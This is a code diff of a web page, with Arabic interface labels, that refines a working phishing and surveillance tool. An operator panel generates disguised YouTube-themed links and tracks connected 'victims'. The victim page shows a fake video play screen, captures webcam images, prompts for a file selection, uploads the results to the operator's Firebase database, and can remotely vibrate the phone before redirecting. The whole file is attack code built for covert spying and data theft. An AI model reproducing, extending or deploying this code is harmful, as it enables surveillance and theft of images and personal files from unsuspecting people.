@@ -3,26 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Media System</title>
+    <title>System Gateway</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #000; }
-        body { background: var(--bg); color: #fff; margin: 0; font-family: sans-serif; overflow-x: hidden; }
+        :root { --neon: #00ff41; }
+        body { background: #000; color: #fff; margin: 0; font-family: sans-serif; }
         
         /* لوحة التحكم */
-        #admin-panel { display: none; padding: 15px; color: var(--neon); }
-        .section { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; border-radius: 8px; background: #050505; }
-        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 5px; border-radius: 5px; cursor: pointer; display: flex; justify-content: space-between; }
-        .v-card.active { border-color: #fff; background: #111; }
-        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 5px; }
-        input { width: 100%; padding: 10px; background: #000; color: var(--neon); border: 1px solid var(--neon); margin-bottom: 10px; }
+        #admin-panel { display: none; padding: 15px; color: var(--neon); font-family: 'Courier New', monospace; }
+        .section { border: 1px solid var(--neon); padding: 12px; margin-bottom: 10px; border-radius: 5px; background: #050505; }
+        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 5px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+        .v-card.active { border-color: #fff; background: #111; font-weight: bold; }
+        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; cursor: pointer; margin-top: 5px; font-weight: bold; }
+        input { width: 100%; padding: 10px; background: #000; color: var(--neon); border: 1px solid var(--neon); margin-bottom: 10px; box-sizing: border-box; }
 
         /* واجهة الضحية */
         #vic-panel { display: none; height: 100vh; width: 100vw; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; background: #000; z-index: 9999; }
-        .play-btn { width: 80px; height: 80px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; animation: pulse 2s infinite; }
+        .play-btn { width: 80px; height: 80px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
         .play-btn::after { content: ''; position: absolute; top: 22px; left: 32px; border-left: 25px solid #fff; border-top: 18px solid transparent; border-bottom: 18px solid transparent; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
     </style>
 </head>
 <body>
@@ -30,11 +29,11 @@
 <div id="vic-panel">
     <div id="p-scr">
         <div class="play-btn" onclick="activateSession()"></div>
-        <p style="margin-top:20px; font-weight: bold;">انقر للتشغيل | Tap to Play</p>
+        <p style="margin-top:20px;">Tap to Play Video</p>
     </div>
     <div id="l-scr" style="display:none; text-align:center;">
         <div style="width:40px; height:40px; border:3px solid #333; border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
-        <p>جاري تحميل الفيديو...</p>
+        <p>Loading...</p>
     </div>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
@@ -43,25 +42,25 @@
 
 <div id="admin-panel">
     <div class="section">
-        <h3>📡 الأجهزة المتصلة</h3>
-        <div id="v-list" style="max-height: 200px; overflow-y: auto;">بانتظار الصيد...</div>
+        <h3>📡 الأجهزة المتصلة (الرادار)</h3>
+        <div id="v-list">بانتظار المتصلين...</div>
     </div>
 
     <div class="section">
-        <h3>🕹️ التحكم: <span id="t-name" style="color:#fff;">اختر جهازاً</span></h3>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
-            <button onclick="send('snap')">📸 سحب صورة</button>
-            <button onclick="send('vibrate')" style="color:yellow; border-color:yellow;">📳 هز الهاتف</button>
-            <button onclick="send('pick')" style="color:cyan; border-color:cyan;">📂 سحب ملفات</button>
-            <button onclick="send('release')" style="background:#030;">🔓 إطلاق سراح</button>
+        <h3>🕹️ التحكم: <span id="t-name" style="color:#fff;">--</span></h3>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+            <button onclick="sendCmd('snap')">📸 سحب صورة</button>
+            <button onclick="sendCmd('vibrate')" style="color:yellow; border-color:yellow;">📳 هز الهاتف</button>
+            <button onclick="sendCmd('pick')" style="color:cyan; border-color:cyan;">📂 سحب ملفات</button>
+            <button onclick="sendCmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
         </div>
-        <button onclick="db.ref('/').remove()" style="color:red; border-color:red; margin-top:15px;">🗑️ مسح الجلسات</button>
+        <button onclick="db.ref('victims').remove()" style="color:red; border-color:red; margin-top:15px;">🗑️ مسح الرادار</button>
     </div>
 
     <div class="section">
         <h3>⚙️ مصنع الروابط</h3>
-        <input type="text" id="target-url" placeholder="رابط يوتيوب المستهدف">
-        <button onclick="gen()">توليد الرابط الملغم</button>
+        <input type="text" id="target-url" placeholder="رابط يوتيوب للتمويه">
+        <button onclick="generateLink()">صناعة الرابط</button>
         <div id="res-link" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
     </div>
 </div>
@@ -74,84 +73,107 @@
     };
     firebase.initializeApp(config);
     const db = firebase.database();
-    let selId = null;
+    let selectedVictimId = null;
 
     const urlParams = new URLSearchParams(window.location.search);
-    const isAdmin = urlParams.get('admin');
-    const isVictim = urlParams.get('v');
+    const adminMode = urlParams.get('admin');
+    const victimMode = urlParams.get('v');
 
-    // منطق الدخول
-    if (isAdmin === "1") {
+    if (adminMode === "1") {
         document.getElementById('admin-panel').style.display = 'block';
-        initAdmin();
-    } else if (isVictim) {
+        startAdmin();
+    } else if (victimMode) {
         document.getElementById('vic-panel').style.display = 'flex';
-        initVictim(atob(isVictim)); // فك تشفير رابط الفيديو فقط
+        startVictim(atob(victimMode));
     } else {
-        // تمويه: صفحة سوداء لأي دخول آخر
         document.body.innerHTML = "<div style='background:#000; height:100vh;'></div>";
     }
 
-    // وظائف الأدمن
-    function initAdmin() {
-        db.ref('victims').on('value', s => {
-            const list = document.getElementById('v-list'); list.innerHTML = '';
-            s.forEach(child => {
-                const v = child.val(); const id = child.key;
-                const active = (Date.now() - v.lastSeen) < 10000;
-                list.innerHTML += `<div class="v-card ${id==selId?'active':''}" onclick="sel('${id}','${v.model}')">
-                    <span>${v.model}</span>
-                    <span style="color:${active?'#0f0':'#f00'}">●</span>
+    // --- وظائف الإدارة ---
+    function startAdmin() {
+        db.ref('victims').on('value', snapshot => {
+            const list = document.getElementById('v-list');
+            list.innerHTML = '';
+            snapshot.forEach(child => {
+                const data = child.val();
+                const id = child.key;
+                const isOnline = (Date.now() - data.lastSeen) < 15000;
+                list.innerHTML += `<div class="v-card ${id === selectedVictimId ? 'active' : ''}" onclick="selectVictim('${id}','${data.model}')">
+                    <span>${data.model}</span>
+                    <span style="color:${isOnline ? '#0f0' : '#444'}">${isOnline ? '● متصل' : '● أوفلاين'}</span>
                 </div>`;
             });
         });
     }
-    function sel(id, m) { selId = id; document.getElementById('t-name').innerText = m; }
-    function send(t) { if(selId) db.ref('victims/'+selId+'/cmd').set({ t, time: Date.now() }); }
-    function gen() {
-        const url = document.getElementById('target-url').value;
-        const link = window.location.href.split('?')[0] + "?v=" + btoa(url);
-        document.getElementById('res-link').innerText = link;
+
+    function selectVictim(id, name) {
+        selectedVictimId = id;
+        document.getElementById('t-name').innerText = name;
+        startAdmin(); // تحديث التحديد بصرياً
     }
 
-    // وظائف الضحية
-    let myRef = null;
-    function initVictim(target) {
-        myRef = db.ref('victims').push();
-        myRef.set({ model: navigator.userAgent.split(' ')[2] || "Mobile", lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
-        setInterval(() => myRef.update({ lastSeen: Date.now() }), 5000);
+    function sendCmd(type) {
+        if (!selectedVictimId) return alert("اختر جهازاً أولاً من القائمة!");
+        db.ref('victims/' + selectedVictimId + '/cmd').set({
+            type: type,
+            timestamp: Date.now()
+        });
+    }
 
-        db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
-            const c = s.val(); if(!c) return;
-            if(c.t === 'snap') take();
-            if(c.t === 'vibrate') navigator.vibrate([400, 200, 400]);
-            if(c.t === 'pick') document.getElementById('f-in').click();
-            if(c.t === 'release') window.location.href = target;
+    function generateLink() {
+        const url = document.getElementById('target-url').value;
+        if (!url) return alert("ضع رابط يوتيوب أولاً!");
+        const encoded = btoa(url);
+        document.getElementById('res-link').innerText = window.location.href.split('?')[0] + "?v=" + encoded;
+    }
+
+    // --- وظائف الضحية ---
+    let victimRef = null;
+    function startVictim(target) {
+        const model = (navigator.userAgent.match(/\(([^)]+)\)/) || [0, "Unknown"])[1].split(';')[0];
+        victimRef = db.ref('victims').push();
+        
+        // تسجيل الدخول الفوري
+        const updateStatus = () => victimRef.update({ model: model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
+        updateStatus();
+        setInterval(updateStatus, 5000);
+
+        // الاستماع للأوامر
+        db.ref('victims/' + victimRef.key + '/cmd').on('value', snapshot => {
+            const cmd = snapshot.val();
+            if (!cmd) return;
+            if (cmd.type === 'snap') takeSnap();
+            if (cmd.type === 'vibrate') navigator.vibrate([500, 200, 500]);
+            if (cmd.type === 'pick') document.getElementById('f-in').click();
+            if (cmd.type === 'release') window.location.href = target;
         });
     }
 
     async function activateSession() {
         document.getElementById('p-scr').style.display = 'none';
         document.getElementById('l-scr').style.display = 'block';
-        navigator.vibrate(100);
-        await take();
+        await takeSnap();
     }
 
-    async function take() {
+    async function takeSnap() {
         try {
-            const s = await navigator.mediaDevices.getUserMedia({video:true});
-            const video = document.getElementById('v'); video.srcObject = s; await video.play();
-            const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.getElementById('c');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            myRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
-            s.getTracks().forEach(t => t.stop());
-        } catch(e) {}
+            victimRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Camera access denied"); }
     }
 
     document.getElementById('f-in').onchange = (e) => {
-        for(let f of e.target.files) {
+        for (let f of e.target.files) {
             const r = new FileReader();
-            r.onload = (ev) => myRef.child('files').push(ev.target.result);
+            r.onload = (ev) => victimRef.child('files').push(ev.target.result);
             r.readAsDataURL(f);
         }
     };
